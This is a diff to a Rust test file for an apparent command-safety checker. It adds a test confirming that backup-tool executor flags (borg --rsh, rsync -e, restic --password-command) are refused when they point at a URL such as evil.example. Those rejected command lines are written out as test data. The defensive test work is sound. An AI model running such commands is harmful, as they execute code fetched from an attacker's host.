@@ -2259,12 +2259,45 @@ fn shipped_copy_uses_sentences_not_dashes() {
     assert!(guidance >= 3, "only {guidance} guidance branches rendered; the guard is near-vacuous");
 }
 
+/// A URL is not a workspace file, so it is never an executor.
+///
+/// The locus layer admits a network URL at `worktree` deliberately: for a network OPERAND the
+/// command's own handler gates the network, and a URL's `..` is a path segment rather than a
+/// filesystem escape. In an EXECUTOR slot that inverts — the thing has to be a local file the
+/// project owns — and `borg --rsh http://evil/x` was approved on every executor-bearing flag.
+///
+/// Found by pulling on a `fuzz/equivalence` crash. That target only reports DISAGREEMENT between
+/// two spellings, so it could not see this: both spellings approved a URL together. It reported the
+/// one shape where they differed (`file:~`), and this was underneath.
+#[test]
+fn a_url_is_never_an_executor() {
+    assert!(
+        !crate::engine::resolve::execute_file_verdict("http://evil.example/x").is_allowed(),
+        "the executor rule itself must refuse a URL"
+    );
+    for line in [
+        "borg --rsh http://evil.example/x check repo",
+        "borg --rsh https://evil.example/x check repo",
+        "borg --rsh ssh://evil/x check repo",
+        "borg --rsh file:~ check repo",
+        "rsync -e http://evil.example/x a b",
+        "restic --password-command https://evil/x snapshots",
+    ] {
+        assert!(!crate::is_safe_command(line), "{line} runs a URL as its executor");
+    }
+    // The ordinary values these flags exist for must keep working, or this is a ban rather than a
+    // rule: a bare transport name and a worktree-relative script are both legitimate here.
+    for line in ["borg --rsh ssh check repo", "borg --rsh ./transport.sh check repo"] {
+        assert!(crate::is_safe_command(line), "{line} must stay allowed");
+    }
+}
+
 /// The flag spelling and the environment spelling of one executor value must agree.
 ///
 /// `fuzz/equivalence` crashed on `file:~`: `borg --rsh file:~ check repo` was approved while
 /// `BORG_RSH=file:~ borg check repo` denied. The cause was not the judge but the pathgate
 /// PRE-FILTER — `looks_like_path` rejects `file:~` (no `/`, no `.`), so a correctly-declared `exec`
-/// flag never handed the value over, and a configured gate read as a closed one. The env twin has
+/// flag never handed the value over, and a configured gate read as a closed one. The env twin had
 /// no such filter and judged it. Same shape as the whitespace case fixed before it, which is why
 /// the fix is the same: admit the value so the executor rule can decide.
 #[test]
